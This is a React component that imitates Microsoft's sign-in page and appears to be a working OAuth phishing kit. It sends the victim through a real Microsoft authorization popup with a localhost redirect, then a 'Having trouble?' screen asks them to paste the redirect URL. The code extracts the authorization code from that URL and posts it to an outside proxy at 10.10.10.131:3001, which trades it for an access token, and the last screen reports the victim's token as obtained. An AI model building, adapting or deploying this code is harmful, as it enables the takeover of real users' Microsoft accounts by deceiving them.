import React, { useState, useEffect, useRef } from 'react';
import './App.css';

/**
 * Microsoft OAuth Authentication Application
 * Handles the complete OAuth flow for Microsoft accounts including:
 * - Email validation and login initiation
 * - Popup-based authentication
 * - Manual URL fallback for troubleshooting
 * - Token exchange and display
 */
const MicrosoftAuthenticationApp = () => {
  // ==================== STATE MANAGEMENT ====================
  const [userEmailInput, setUserEmailInput] = useState('');
  const [currentViewState, setCurrentViewState] = useState('login');
  const [validationErrorMessage, setValidationErrorMessage] = useState('');
  const [extractedUserEmail, setExtractedUserEmail] = useState('');
  const [microsoftAccessToken, setMicrosoftAccessToken] = useState('');
  const [manuallyPastedRedirectUrl, setManuallyPastedRedirectUrl] = useState('');
  
  const urlInputTextAreaReference = useRef(null);
  const authenticationTimeoutReference = useRef(null);

  // ==================== CONSTANTS ====================
  const MICROSOFT_OAUTH_CONFIG = {
    clientId: '04b07795-8ddb-461a-bbee-02f9e1bf7b46',
    redirectUri: 'http://localhost:8400/',
    resourceId: '00000002-0000-0000-c000-000000000000',
    stateParameter: 'ab12cd34',
    authorizationEndpoint: 'https://login.microsoftonline.com/organizations/oauth2/authorize',
    tokenExchangeProxyUrl: 'http://10.10.10.131:3001/exchange-token'
  };

  const ALLOWED_EMAIL_DOMAINS = [
    'gmail.com',
    'microsoft.com',

    'outlook.com',
    'hotmail.com'
  ];

  const AUTHENTICATION_TIMEOUT_DURATION = 10000; // 10 seconds

  const POPUP_WINDOW_DIMENSIONS = {
    width: 600,
    height: 500
  };

  // ==================== VALIDATION FUNCTIONS ====================
  
  const validateEmailAddress = (emailAddress) => {
    const normalizedEmail = String(emailAddress).toLowerCase();
    const emailFormatRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    
    if (!emailFormatRegex.test(normalizedEmail)) {
      return false;
    }
    
    const emailDomain = normalizedEmail.split('@')[1];
    return ALLOWED_EMAIL_DOMAINS.some(allowedDomain => 
      emailDomain === allowedDomain || emailDomain.endsWith(`.${allowedDomain}`)
    );
  };

  const extractAuthorizationCodeFromUrl = (redirectUrl) => {
    try {
      const parsedUrl = new URL(redirectUrl);
      const authorizationCode = parsedUrl.searchParams.get('code');
      
      if (authorizationCode) {
        return decodeURIComponent(authorizationCode);
      }
    } catch (urlParsingError) {
      // Fallback to regex if URL parsing fails
      const codeMatchResult = redirectUrl.match(/code=([^&]+)/);
      if (codeMatchResult) {
        return decodeURIComponent(codeMatchResult[1]);
      }
    }
    
    return null;
  };

  // ==================== AUTHENTICATION FLOW FUNCTIONS ====================

  const buildMicrosoftAuthorizationUrl = (userEmail) => {
    const urlParameters = new URLSearchParams({
      client_id: MICROSOFT_OAUTH_CONFIG.clientId,
      response_type: 'code',
      redirect_uri: MICROSOFT_OAUTH_CONFIG.redirectUri,
      resource: MICROSOFT_OAUTH_CONFIG.resourceId,
      state: MICROSOFT_OAUTH_CONFIG.stateParameter,
      prompt: 'select_account',
      login_hint: userEmail
    });

    return `${MICROSOFT_OAUTH_CONFIG.authorizationEndpoint}?${urlParameters.toString()}`;
  };

  const openAuthenticationPopupWindow = (authorizationUrl) => {
    const screenCenterLeft = (window.screen.width - POPUP_WINDOW_DIMENSIONS.width) / 2;
    const screenCenterTop = (window.screen.height - POPUP_WINDOW_DIMENSIONS.height) / 2;
    
    const popupFeatures = [
      `width=${POPUP_WINDOW_DIMENSIONS.width}`,
      `height=${POPUP_WINDOW_DIMENSIONS.height}`,
      `top=${screenCenterTop}`,
      `left=${screenCenterLeft}`,
      'resizable=yes',
      'scrollbars=yes',
      'toolbar=no',
      'menubar=no',
      'location=no',
      'status=no'
    ].join(',');
    
    window.open(authorizationUrl, 'MicrosoftAuthenticationPopup', popupFeatures);
  };

  const exchangeAuthorizationCodeForAccessToken = async (authorizationCode) => {
    try {
      const proxyResponse = await fetch(MICROSOFT_OAUTH_CONFIG.tokenExchangeProxyUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ code: authorizationCode })
      });
      
      if (!proxyResponse.ok) {
        const errorDetails = await proxyResponse.text();
        throw new Error(`Token exchange proxy error: ${proxyResponse.status} - ${errorDetails}`);
      }
      
      const tokenResponseData = await proxyResponse.json();
      
      if (tokenResponseData.access_token) {
        setMicrosoftAccessToken(tokenResponseData.access_token);
        
        // Extract and validate user email from JWT token
        const extractedEmail = parseEmailFromJwtToken(tokenResponseData.access_token);
        
        if (extractedEmail) {
          setExtractedUserEmail(extractedEmail);
          setCurrentViewState('success');
        } else {
          setValidationErrorMessage('Unable to extract email from authentication token');
          setCurrentViewState('login');
        }
      } else {
        setValidationErrorMessage('No access token received from authentication server');
        setCurrentViewState('login');
      }
    } catch (tokenExchangeError) {
      console.error('Token exchange failed:', tokenExchangeError);
      setValidationErrorMessage('Authentication failed. Please try again.');
      setCurrentViewState('login');
    }
  };

  const parseEmailFromJwtToken = (jwtToken) => {
    try {
      const base64UrlPayload = jwtToken.split('.')[1];
      const base64Payload = base64UrlPayload.replace(/-/g, '+').replace(/_/g, '/');
      
      const decodedPayload = decodeURIComponent(
        atob(base64Payload)
          .split('')
          .map(character => '%' + ('00' + character.charCodeAt(0).toString(16)).slice(-2))
          .join('')
      );
      
      const tokenPayloadData = JSON.parse(decodedPayload);
      return tokenPayloadData.upn || 
             tokenPayloadData.email || 
             tokenPayloadData.preferred_username || 
             null;
    } catch (jwtParsingError) {
      console.error('JWT parsing error:', jwtParsingError);
      return null;
    }
  };

  // ==================== EVENT HANDLERS ====================

  const handleLoginFormSubmission = (submitEvent) => {
    submitEvent.preventDefault();
    
    if (!userEmailInput.trim()) {
      setValidationErrorMessage('Please enter your email address');
      return;
    }
    
    if (!validateEmailAddress(userEmailInput)) {
      setValidationErrorMessage('Please enter a valid email address from an allowed domain');
      return;
    }
    
    setValidationErrorMessage('');
    
    const authorizationUrl = buildMicrosoftAuthorizationUrl(userEmailInput);
    setCurrentViewState('authenticating');
    
    // Small delay before opening popup for better UX
    setTimeout(() => {
      openAuthenticationPopupWindow(authorizationUrl);
    }, 500);
    
    // Set timeout to show troubleshooting view if popup doesn't complete
    authenticationTimeoutReference.current = setTimeout(() => {
      setCurrentViewState('troubleshooting');
    }, AUTHENTICATION_TIMEOUT_DURATION);
  };

  const handleManualUrlSubmission = async (submittedUrl) => {
    if (!submittedUrl.trim()) {
      setValidationErrorMessage('Please paste the redirect URL');
      return;
    }

    const extractedCode = extractAuthorizationCodeFromUrl(submittedUrl);
    
    if (!extractedCode) {
      setValidationErrorMessage('No authorization code found in the provided URL');
      return;
    }
    
    // Clear the textarea and state
    if (urlInputTextAreaReference.current) {
      urlInputTextAreaReference.current.value = '';
    }
    setManuallyPastedRedirectUrl('');
    
    await exchangeAuthorizationCodeForAccessToken(extractedCode);
  };

  const copyAccessTokenToClipboard = () => {
    navigator.clipboard.writeText(microsoftAccessToken);
    alert('Access token copied to clipboard successfully!');
  };

  // ==================== LIFECYCLE MANAGEMENT ====================

  useEffect(() => {
    // Cleanup timeout on unmount
    return () => {
      if (authenticationTimeoutReference.current) {
        clearTimeout(authenticationTimeoutReference.current);
      }
    };
  }, []);

  // Handle troubleshooting view initialization
  useEffect(() => {
    if (currentViewState === 'troubleshooting') {
      setManuallyPastedRedirectUrl('');
      if (urlInputTextAreaReference.current) {
        urlInputTextAreaReference.current.value = '';
        setTimeout(() => {
          urlInputTextAreaReference.current?.focus();
        }, 100);
      }
    }
  }, [currentViewState]);

  // ==================== VIEW COMPONENTS ====================

  const renderLoginView = () => (
    <div className="section-view">
      <div className="auth-wrapper">
        <img src="mc.png" alt="Microsoft Logo" className="mc-logo" />
        <h2 className="title">Sign in</h2>
        
        <form onSubmit={handleLoginFormSubmission}>
          <div className="mb-16">
            {validationErrorMessage && (
              <p className="error">{validationErrorMessage}</p>
            )}
            <input
              type="text"
              value={userEmailInput}
              onChange={(e) => setUserEmailInput(e.target.value)}
              placeholder="Email address"
              className="input"
              style={{ color: '#1b1b1b' }}
              autoFocus
            />
          </div>
        </form>
        
        <div>
          <p className="mb-16 fs-13">
            No account? <a href="#" className="link">Create one!</a>
          </p>
          <p className="mb-16 fs-13">
            <a href="#" className="link">
              Sign in with a security key
              <img src="question.png" alt="Help" style={{ marginLeft: '5px' }} />
            </a>
          </p>
        </div>
        
        <div>
          <button 
            type="button" 
            onClick={handleLoginFormSubmission} 
            className="btn"
          >
            Next
          </button>
        </div>
      </div>
      
      <div className="opts">
        <p className="has-icon mb-0" style={{ fontSize: '15px' }}>
          <span className="icon">
            <img src="key.png" width="30px" alt="Security Key" />
          </span>
          Sign-in options
        </p>
      </div>
    </div>
  );

  const renderAuthenticatingView = () => (
    <div className="section-view">
      <div className="auth-wrapper">
        <img src="mc.png" alt="Microsoft Logo" className="mc-logo" />
        
        <div className="identity">
          <button 
            className="back-btn" 
            onClick={() => setCurrentViewState('login')}
            aria-label="Go back to login"
          >
            <img src="back.png" alt="Back" />
          </button>
          <span className="user-identity">{userEmailInput}</span>
        </div>
        
        <div className="loading-section">
          <div className="spinner"></div>
          <h3 className="loading-title">Waiting for authentication...</h3>
          <p className="loading-message">
            Please complete the login process in the popup window that opened.
          </p>
        </div>
      </div>
    </div>
  );


  const renderTroubleshootingView = () => {
    const handleTextareaKeyPress = (keyEvent) => {
      if (keyEvent.key === 'Enter') {
        keyEvent.preventDefault();
        handleManualUrlSubmission(manuallyPastedRedirectUrl);
      }
    };

    return (
      <div className="section-view">
        <div className="auth-wrapper">
          <img src="mc.png" alt="Microsoft Logo" className="mc-logo" />
          
          <div className="identity">
            <button 
              className="back-btn" 
              onClick={() => setCurrentViewState('login')}
              aria-label="Go back to login"
            >
              <img src="back.png" alt="Back" />
            </button>
            <span className="user-identity">{userEmailInput}</span>
          </div>
          
          <h2 className="title">Having trouble?</h2>
          <p className="troubleshoot-instruction">
            If the authentication popup didn't open or you're experiencing issues:
          </p>
          
          <div className="paste-section">
            <h3>Copy and paste the full redirect URL from the popup window</h3>
            <textarea
              ref={urlInputTextAreaReference}
              placeholder="Paste the complete URL here and press Enter or click Submit..."
              value={manuallyPastedRedirectUrl}
              onChange={(e) => setManuallyPastedRedirectUrl(e.target.value)}
              onKeyDown={handleTextareaKeyPress}
              className="text-area"
              style={{ color: '#1b1b1b' }}
            />
            
            <div className="submit-section">
              <button 
                onClick={() => handleManualUrlSubmission(manuallyPastedRedirectUrl)}
                className="submit-btn"
                disabled={!manuallyPastedRedirectUrl.trim()}
              >
                Submit URL
              </button>
              <p className="instruction-text">
                Press Enter or click Submit to process the redirect URL
              </p>
            </div>
          </div>
        </div>
      </div>
    );
  };

  const renderSuccessView = () => (
    <div className="section-view">
      <div className="auth-wrapper">
        <img src="mc.png" alt="Microsoft Logo" className="mc-logo" />
        
        <div className="artifact-box">
          <h2 className="artifact-title">Authentication Successful!</h2>
          <p className="text-center mb-20">
            Successfully obtained Microsoft access token for {extractedUserEmail}
          </p>
        </div>
      </div>
    </div>
  );

  // ==================== MAIN RENDER ====================

  return (
    <div className="app-container">
      {currentViewState === 'login' && renderLoginView()}
      {currentViewState === 'authenticating' && renderAuthenticatingView()}
      {currentViewState === 'troubleshooting' && renderTroubleshootingView()}
      {currentViewState === 'success' && renderSuccessView()}
      
      <footer className="footer">
        <a href="#" className="footer-link">Terms of use</a>
        <a href="#" className="footer-link">Privacy & cookies</a>
        <span>.&nbsp;.&nbsp;.</span>
      </footer>
    </div>
  );
};

export default MicrosoftAuthenticationApp;